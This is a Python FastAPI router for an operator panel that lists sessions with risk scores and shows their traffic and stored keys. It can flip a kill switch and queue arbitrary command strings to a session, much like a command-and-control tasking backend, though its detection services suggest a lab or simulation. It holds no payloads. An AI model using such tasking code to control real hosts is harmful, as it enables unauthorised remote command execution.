from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from app.core.security import client_ip
from app.db import execute, now_iso, query_all, query_one
from app.services import tasking
from app.services.capture import record_traffic
from app.services.detection import compute_risk, run_rules

router = APIRouter(prefix="/api/panel", tags=["panel"])


class TaskIn(BaseModel):
    session_uuid: str
    command: str


class PathStatus(BaseModel):
    status: str
    kill_switch: int = 0


@router.get("/sessions")
def sessions():
    rows = query_all("SELECT * FROM sessions ORDER BY last_seen DESC")
    for r in rows:
        r["risk_score"] = compute_risk(r["uuid"])
    return rows


@router.get("/sessions/{uuid}")
def session_detail(uuid: str):
    s = query_one("SELECT * FROM sessions WHERE uuid=?", (uuid,))
    if not s:
        raise HTTPException(404, "session not found")
    s["risk_score"] = compute_risk(uuid)
    s["traffic"] = query_all("SELECT * FROM traffic WHERE session_uuid=? ORDER BY id", (uuid,))
    s["tasks"] = tasking.list_tasks(uuid)
    s["keys"] = query_all("SELECT * FROM keys WHERE session_uuid=?", (uuid,))
    return s


@router.patch("/sessions/{uuid}")
def patch_session(uuid: str, body: PathStatus, request: Request):
    if not query_one("SELECT 1 AS ok FROM sessions WHERE uuid=?", (uuid,)):
        raise HTTPException(404, "session not found")
    execute(
        "UPDATE sessions SET status=?, kill_switch=? WHERE uuid=?",
        (body.status, body.kill_switch, uuid),
    )
    from app.core import security as sec
    sec.audit("PANEL", f"update:{body.status}", "C", f"session {uuid}", client_ip(request))
    if body.status == "flagged":
        record_traffic(uuid, "kill_switch", dst_port=443, record_len=16, meta={"engaged": True})
        run_rules(uuid)
    return {"ok": True}


@router.post("/tasks")
def create_task(body: TaskIn, request: Request):
    if not query_one("SELECT 1 AS ok FROM sessions WHERE uuid=?", (body.session_uuid,)):
        raise HTTPException(404, "session not found")
    t = tasking.create_task(body.session_uuid, body.command)
    from app.core import security as sec
    sec.audit("PANEL", "task", "C", f"task {t['task_id']} -> {body.session_uuid}", client_ip(request))
    return t


@router.get("/tasks")
def tasks():
    return tasking.list_tasks()


@router.get("/keys/{uuid}")
def session_keys(uuid: str):
    return query_all("SELECT * FROM keys WHERE session_uuid=? ORDER BY id", (uuid,))